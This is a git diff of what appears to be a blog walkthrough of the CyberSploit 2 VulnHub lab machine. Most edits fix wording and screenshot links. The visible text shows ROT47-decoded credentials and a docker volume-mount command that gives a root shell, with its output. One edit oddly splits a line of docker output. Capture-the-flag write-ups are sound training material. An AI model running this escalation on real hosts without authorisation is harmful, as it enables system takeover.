@@ -1,5 +1,5 @@
 ---
-title: CyberSploit 2 Vulnhub Walkthrough
+title: CyberSploit 2 VulnHub Walkthrough
 date: 2024-04-15
 categories: [Walkthrough]
 tags: [Walkthrough, CTF, VulnHub]
@@ -72,13 +72,13 @@ Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
 
 Explore the identified HTTP service (e.g., browse to `http://<target_IP>` in a web browser).
 
-![Webpage Screenshot](path/to/screenshot.png)
+![Webpage Screenshot](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/655ba6b0-cc80-4aa0-b954-af52a31cda0f)
 
-Here You Can See In The Image on Line 4 `D92:=6?5C2` & `4J36CDA=@:E` Hashes 
+Here on Line 4 of the webpage, hashes `D92:=6?5C2` & `4J36CDA=@:E` are found.
 
-![Source Code Screenshot](oath/to/screenshot.png)
+![Source Code Screenshot](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/69ec26be-98dd-4b62-9472-25bd5ddea149)
 
-The webpage source code 126 line  `<!----------ROT47---------->`  giving a hinit for line 4 is `rot47` format hash.
+The webpage source code at line 126 contains `<!-- ROT47 -->` hint for line 4 hash in ROT47 format.
 
 #### Let's Crack The Hash Using ROT47
 
@@ -89,7 +89,7 @@ The webpage source code 126 line  `<!----------ROT47---------->`  giving a hinit
 shailendra
 ```
 
-### Cracking the Second Hash
+Cracking the Second Hash:
 
 ```bash
 ┌──(root㉿neo)-[~]
@@ -130,13 +130,17 @@ docker
 
 Search for Docker-related vulnerabilities using [GTFOBins](https://gtfobins.github.io/gtfobins/docker/).
 
+![GTFOBins Screenshots](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/5cd3822f-3ae5-4ff1-bb5b-c614b26729e8)
+
 Execute Docker commands to escalate privileges to root:
 
 ```bash
 [shailendra@localhost ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 Unable to find image 'alpine:latest' locally
 latest: Pulling from library/alpine
-4abcf2066143: Pull complete 
+4abcf2066143
+
+: Pull complete 
 Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b
 Status: Downloaded newer image for alpine:latest
 sh-4.4# 
@@ -166,4 +170,4 @@ sh-4.4#
 
 ## Conclusion
 
-Congratulations! You have successfully rooted the CyberSploit2 VM from Vulnhub.
+Congratulations! You have successfully rooted the CyberSploit2 VM from VulnHub.
